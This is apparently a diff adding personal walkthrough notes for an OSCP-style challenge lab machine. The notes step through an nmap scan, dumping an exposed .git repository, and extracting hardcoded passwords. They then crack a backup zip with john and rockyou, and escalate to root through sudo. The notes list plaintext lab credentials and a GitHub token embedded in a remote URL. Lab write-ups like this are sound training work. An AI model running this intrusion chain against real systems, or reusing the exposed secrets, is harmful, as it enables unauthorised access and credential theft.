@@ -1,0 +1,71 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.144 > 144.txt
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Home
+| http-git: 
+|   192.168.157.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-generator: Nicepage 4.21.12, nicepage.com
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+found .git directory in port 80 website.
+https://github.com/arthaud/git-dumper/tree/master
+
+use git_dumper to get whole .git directories.
+git diff-tree -p HEAD 
+# git diff-tree: This command compares the content of "tree" objects (think of these as snapshots of the folder structure).
+-p (Patch): This tells Git to generate a "patch" or a "diff." This shows you the actual lines of code that were added (+) or removed (-).
+HEAD: This is a pointer to the most recent commit in the branch you are currently on.
+get credential.
+private $username = "stuart@challenge.lab";
+private $password = "BreakingBad92";
+
+$ ssh stuart@192.168.157.144
+Found zip file in /opt/backup/
+
+$ scp stuart@192.168.157.144:/opt/backup/sitebackup3.zip .
+$ zip2john sitebackup3.zip > hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+get zip password: codeblue
+found in configuration.php
+chloe:Ee24zIK4cDhJHL4H
+stuart@oscp:/opt/backup$ su chloe
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+chloe@oscp:/opt/backup$ id
+uid=1011(chloe) gid=1011(chloe) groups=1011(chloe),27(sudo)
+chloe@oscp:/opt/backup$ sudo su
+[sudo] password for chloe: 
+root@oscp:/opt/backup# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
